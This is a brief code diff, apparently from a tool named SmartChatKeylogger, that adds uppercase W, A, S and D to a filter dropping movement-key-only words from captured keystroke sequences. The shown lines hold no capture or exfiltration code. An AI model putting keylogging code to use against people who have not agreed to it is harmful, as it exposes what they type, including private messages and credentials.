@@ -474,7 +474,7 @@ class SmartChatKeylogger:
 
         # Split into words and filter out WASD-only words
         words = sequence.split()
-        wasd_chars = {"w", "a", "s", "d"}
+        wasd_chars = {"w", "a", "s", "d", "W", "A", "S", "D"}
 
         # Filter out words that only contain W, A, S, D characters
         real_words = []
